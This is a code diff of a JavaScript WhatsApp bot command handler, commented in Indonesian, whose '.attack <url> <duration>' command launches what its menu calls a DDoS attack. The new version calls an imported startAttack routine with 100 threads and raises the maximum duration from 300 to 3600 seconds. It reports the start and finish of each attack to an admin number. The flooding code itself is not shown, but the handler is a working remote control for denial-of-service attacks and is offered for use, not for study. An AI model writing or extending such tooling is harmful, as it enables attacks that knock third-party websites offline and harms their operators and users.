@@ -1,50 +1,99 @@
-const { spawn } = require('child_process');
+const { startAttack } = require('./attack');
 
-module.exports = (sock, message, config) => {
-    const body = message.message.conversation || message.message.extendedTextMessage?.text || '';
-    const from = message.key.remoteJid;
+/**
+ * Handler untuk command WhatsApp
+ * @param {object} sock - Socket connection
+ * @param {string} adminNumber - Nomor admin WhatsApp
+ * @param {number} connectionIndex - Index koneksi
+ * @param {string} text - Teks pesan yang diterima
+ */
+async function handleCommand(sock, adminNumber, connectionIndex, text) {
+    try {
+        // Command .menu
+        if (text === '.menu') {
+            const menuText = `
+*🤖 BOT MENU* - Connection ${connectionIndex}
 
-    // Cek apakah pengirim adalah admin
-    if (from !== config.adminNumber) {
-        return sock.sendMessage(from, { text: 'Maaf, hanya admin yang dapat menggunakan bot ini.' });
-    }
+*.menu* - Menampilkan menu ini
+*.attack <url> <duration>* - Melakukan serangan DDoS
+*.status* - Menampilkan status koneksi
 
-    if (body === '.menu') {
-        const menuText = `
-*Menu Bot*
-- .menu : Menampilkan menu
-- .attack <url> <duration> : Melakukan serangan DDoS ke url selama duration (detik)
-        `;
-        sock.sendMessage(from, { text: menuText });
-    } else if (body.startsWith('.attack')) {
-        const args = body.split(' ');
-        if (args.length < 3) {
-            return sock.sendMessage(from, { text: 'Format salah. Gunakan: .attack <url> <duration>' });
+_Example: .attack https://example.com 60_
+            `;
+            await sock.sendMessage(adminNumber + '@s.whatsapp.net', { text: menuText });
         }
 
-        const url = args[1];
-        const duration = parseInt(args[2]);
+        // Command .attack
+        else if (text.startsWith('.attack ')) {
+            const args = text.split(' ');
+            if (args.length < 3) {
+                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { text: '❌ Usage: .attack <url> <duration>' });
+                return;
+            }
+            
+            const url = args[1];
+            const duration = parseInt(args[2]);
+            const threads = 100;
+            const delayMs = 100;
 
-        // Validasi URL
-        try {
-            new URL(url);
-        } catch (e) {
-            return sock.sendMessage(from, { text: 'URL tidak valid.' });
+            // Validasi URL
+            if (!isValidUrl(url)) {
+                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
+                    text: '❌ URL tidak valid! Pastikan URL diawali dengan http:// atau https://' 
+                });
+                return;
+            }
+
+            // Validasi duration
+            if (isNaN(duration) || duration < 1 || duration > 3600) {
+                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
+                    text: '❌ Durasi tidak valid! Gunakan angka antara 1-3600 detik' 
+                });
+                return;
+            }
+
+            // Kirim konfirmasi
+            await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
+                text: `🚀 Memulai attack ke ${url}\n⏱ Durasi: ${duration} detik\n🧵 Threads: ${threads}\n⏳ Delay: ${delayMs}ms\n\nConnection: ${connectionIndex}` 
+            });
+
+            // Jalankan attack
+            startAttack(url, duration, threads, delayMs);
+
+            // Kirim notifikasi ketika attack selesai (setelah duration)
+            setTimeout(async () => {
+                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
+                    text: `✅ Attack ke ${url} selesai\nConnection: ${connectionIndex}` 
+                });
+            }, duration * 1000);
         }
 
-        // Validasi duration
-        if (isNaN(duration) || duration <= 0 || duration > 300) {
-            return sock.sendMessage(from, { text: 'Duration harus antara 1-300 detik.' });
+        // Command .status
+        else if (text === '.status') {
+            await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
+                text: `✅ Connection ${connectionIndex} aktif dan berjalan\n\nGunakan .menu untuk melihat daftar perintah` 
+            });
         }
-
-        // Jalankan attack
-        const attackProcess = spawn('node', [__dirname + '/attack.js', url, duration.toString()], {
-            detached: true,
-            stdio: 'ignore'
+    } catch (error) {
+        console.error('❌ Error handling command:', error);
+        await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
+            text: `❌ Terjadi error: ${error.message}` 
         });
-
-        attackProcess.unref();
-
-        sock.sendMessage(from, { text: `Memulai serangan ke ${url} selama ${duration} detik.` });
     }
-};
+}
+
+/**
+ * Validasi URL
+ * @param {string} string - URL yang akan divalidasi
+ * @returns {boolean} - True jika URL valid
+ */
+function isValidUrl(string) {
+    try {
+        new URL(string);
+        return true;
+    } catch (_) {
+        return false;
+    }
+}
+
+module.exports = { handleCommand };
